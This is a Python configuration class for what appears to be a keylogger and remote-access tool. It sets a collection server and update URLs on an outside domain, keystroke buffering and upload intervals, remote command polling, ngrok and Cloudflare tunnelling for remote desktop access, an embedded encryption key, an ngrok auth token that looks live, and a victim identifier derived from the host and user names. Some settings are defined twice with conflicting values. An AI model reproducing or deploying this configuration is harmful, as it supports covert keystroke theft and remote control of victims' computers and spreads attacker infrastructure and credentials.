import base64
import os
import platform
import hashlib

class Config:
    # Connection Settings
    SERVER_URL = "https://fasitheme.ir/logger/api.php/"
    SECRET_TOKEN = "1"
    CHECK_INTERVAL = 120  # seconds (data sync, e.g., keystrokes, system info)
    COMMAND_POLL_INTERVAL = 10  # seconds
    COMMAND_TIMEOUT = 5  # seconds, for HTTP request timeout
    IP_URL = "https://fasitheme.ir/logger/ip.php"
    
    # Security Settings
    ENCRYPTION_KEY = base64.b64decode("nTds2GHvEWeOGJibjZuaf8kY5T5YWyfMx4J3B1NA0Jo=")
    IV_LENGTH = 16
    BUFFER_LIMIT = 100000  # max keystrokes before flush
    CLIENT_VERSION = "1.0"
    UPDATE_URL = "https://fasitheme.ir/logger/version.php"

    CLOUDFLARE_TUNNEL_TOKEN = "your_cloudflare_tunnel_token"
    CLOUDFLARE_BINARY = "cloudflared.exe"
    CLOUDFLARE_SUBDOMAIN = "rdp" 
    CLOUDFLARE_DOMAIN = "example.com" 
    SECRET_TOKEN = "your_secret_token"
    SERVER_URL = "https://your_server_url"
    DEBUG_MODE = True

    NGROK_AUTH_TOKEN = "2xg9jXmy291m3pWFGJ8xWNZGT4Q_3AYBu18nyLppQxTRvw35K"  # Replace with your ngrok auth token
    NGROK_BINARY = "ngrok.exe"  # Name of the ngrok binary included in the build

    
    # System Settings
    EMERGENCY_HOTKEY = "ctrl+alt+shift+k"
    
    # Debug Settings
    DEBUG_MODE = True  # Set to True to enable logging
    ERROR_LOG_FILE = "errors.log"
    MAX_ERROR_LOG_SIZE = 1024 * 1024  # 1MB
    
    @staticmethod
    def get_client_id():
        unique_str = f"{platform.node()}-{os.getlogin()}"
        return hashlib.sha256(unique_str.encode()).hexdigest()[:32]